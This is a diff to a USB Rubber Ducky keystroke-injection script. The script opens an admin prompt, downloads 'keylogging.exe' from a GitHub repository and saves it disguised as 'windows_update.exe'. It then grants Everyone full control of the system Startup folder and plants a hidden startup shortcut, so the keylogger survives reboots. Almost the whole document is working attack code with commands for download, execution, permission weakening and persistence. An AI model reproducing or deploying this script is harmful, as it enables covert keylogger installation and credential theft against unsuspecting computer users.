@@ -1,4 +1,5 @@
-REM ducky script for downloading a file from github and executing it as a process assuming that the user is an admin
+REM ducky script for downloading a file from github and executing it as a process assuming that the user is an admin 
+REM plus adding a shortcut which will run even if the user shuts down or restarts computer
 
 GUI r
 DELAY 200
@@ -7,7 +8,7 @@ ENTER
 DELAY 3500
 ALT y
 DELAY 400
-STRING cd "%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp"
+STRING cd "%USERPROFILE%\Desktop"
 ENTER 
 DELAY 100
 STRING powershell
@@ -16,21 +17,45 @@ DELAY 400
 STRING $wc=New-Object System.Net.Webclient
 ENTER
 DELAY 100
-STRING $wc.DownloadFile("https://github.com/smallmacy/Cyber_Project/raw/master/14Oct2018.exe","windows_update.exe")
+STRING $wc.DownloadFile("https://github.com/smallmacy/Cyber_Project/raw/master/keylogging.exe","windows_update.exe")
 ENTER
 DELAY 5000
-STRING Start-Process "windows_update.exe" -WindowStyle Hidden
+STRING exit
 ENTER
 DELAY 200
-STRING exit
+
+STRING Icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" /grant Everyone:(OI)(CI)F /T
+ENTER
+DELAY 200
+REM This will allow everyone full acess over Startup directory, which is nessecary to run the shortcut 
+
+REM Script for shortcut:
+
+STRING cd "%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp"
+ENTER
+DELAY 150
+STRING start .
+ENTER
+DELAY 500
+MENU w 
+STRING s
+DELAY 300
+STRING C:\Windows\System32\cmd.exe /min /c "set __COMPAT_LAYER=RUNASINVOKER && start "" %USERPROFILE%\Desktop\windows_update.exe"
 ENTER
 DELAY 100
+STRING test.exe
+ENTER
+DELAY 400
+CTRL w
+
+STRING powershell Start-Process "%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp\test.lnk" -WindowStyle Hidden
+ENTER
+DELAY 300
 STRING exit
 ENTER
 
+
 REM the program is running as a process!
-
-
 
 
 
